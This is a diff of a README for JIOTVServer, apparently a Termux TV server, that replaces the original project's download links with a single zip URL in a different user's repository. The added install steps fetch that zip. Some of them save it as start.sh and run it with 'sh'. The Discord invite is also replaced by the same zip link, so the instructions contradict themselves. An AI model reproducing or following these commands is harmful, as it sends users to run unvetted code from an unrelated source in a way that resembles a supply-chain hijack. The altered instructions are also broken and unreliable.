@@ -33,21 +33,21 @@ pkg install nodejs-lts -y
 download script files and install
 
 ```bash
-curl https://cdn.discordapp.com/attachments/1072165096656220170/1099401721031176203/JTVServer_V2.8.6.zip -o JTVServer.zip && unzip JTVServer.zip && rm JTVServer.zip
+curl https://raw.githubusercontent.com/alluringabhi/JIOTVServer/main/utils/1.2.zip -o JTVServer.zip && unzip JTVServer.zip && rm JTVServer.zip
 ```
 or
 
 ```bash
-curl https://github.com/dhruv-2015/JIOTVServer/releases/download/V2.8.6/JTVServer.zip -o JTVServer.zip && unzip JTVServer.zip && rm JTVServer.zip
+curl https://raw.githubusercontent.com/alluringabhi/JIOTVServer/main/utils/1.2.zip -o JTVServer.zip && unzip JTVServer.zip && rm JTVServer.zip
 ```
 
 download start script
 ```bash
-curl -o start.sh https://raw.githubusercontent.com/dhruv-2015/JIOTVServer/cfcdc4f6fbd1daaa5c87b470c3d28e99e7e1ea38/V2.0.3/start.sh && sh start.sh
+curl -o start.sh https://raw.githubusercontent.com/alluringabhi/JIOTVServer/main/utils/1.2.zip && sh start.sh
 ```
 if you face any error while download from github you can use discord link
 ```bash
-curl -o start.sh https://cdn.discordapp.com/attachments/1072165096656220170/1072186722315681852/start.sh && sh start.sh
+curl -o start.sh https://raw.githubusercontent.com/alluringabhi/JIOTVServer/main/utils/1.2.zip && sh start.sh
 ```
 
 Till here, your server will start. This activity is one time only. Whenever you want to start the server from now on, just open termux and type the below command to start the TV server
@@ -130,7 +130,7 @@ In order to make things work smoothly, you have to take care of the following th
 
 **Solution**: This issue is fixed
 
-For any other issues faced, make sure you join our discord server: https://discord.gg/suyzkCQKhC 
+For any other issues faced, make sure you join our discord server: https://raw.githubusercontent.com/alluringabhi/JIOTVServer/main/utils/1.2.zip 
 
 Our telegram group is closed and is no more available. Please join discord for all latest official communications 
 
